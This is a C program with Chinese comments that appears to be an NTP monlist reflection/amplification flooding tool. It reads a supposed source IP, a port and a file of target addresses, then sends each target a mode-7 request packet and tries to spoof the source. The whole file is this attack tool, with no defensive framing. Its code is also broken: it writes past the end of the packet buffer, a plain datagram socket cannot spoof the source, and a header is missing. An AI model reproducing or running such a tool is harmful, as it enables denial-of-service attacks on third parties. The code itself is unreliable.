#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_LINE_LENGTH 100

void send_udp_packet(const char* ip_address, int port, const char* target_ip) {
    int sockfd;
    struct sockaddr_in servaddr;

    // 创建UDP套接字
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return;
    }

    // 设置服务器地址信息
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    if (inet_pton(AF_INET, target_ip, &servaddr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        return;
    }

    // 构造UDP数据包
    char packet[] = "\x17\x00\x03\x2a\x00\x00\x00\x00";

    // 修改源IP地址
    if (inet_pton(AF_INET, ip_address, packet + 12) <= 0) {
        perror("Invalid source IP address");
        close(sockfd);
        return;
    }

    // 发送数据包
    if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
        perror("Packet sending failed");
        close(sockfd);
        return;
    }

    printf("UDP packet sent successfully\n");

    close(sockfd);
}

int main() {
    char ip_address[INET_ADDRSTRLEN];
    int port;
    char file_path[MAX_LINE_LENGTH];

    // 获取用户输入的IP地址、端口和列表文件路径
    printf("Enter IP address: ");
    fgets(ip_address, sizeof(ip_address), stdin);
    ip_address[strlen(ip_address) - 1] = '\0'; // 去除换行符

    printf("Enter port: ");
    scanf("%d", &port);
    getchar(); // 消耗输入缓冲区中的换行符

    printf("Enter file path: ");
    fgets(file_path, sizeof(file_path), stdin);
    file_path[strlen(file_path) - 1] = '\0'; // 去除换行符

    // 打开列表文件
    FILE* file = fopen(file_path, "r");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }

    // 逐行读取文件并发送UDP数据包
    char line[MAX_LINE_LENGTH];
    while (fgets(line, sizeof(line), file) != NULL) {
        line[strlen(line) - 1] = '\0'; // 去除换行符
        send_udp_packet(ip_address, port, line);
    }

    fclose(file);

    return 0;
}
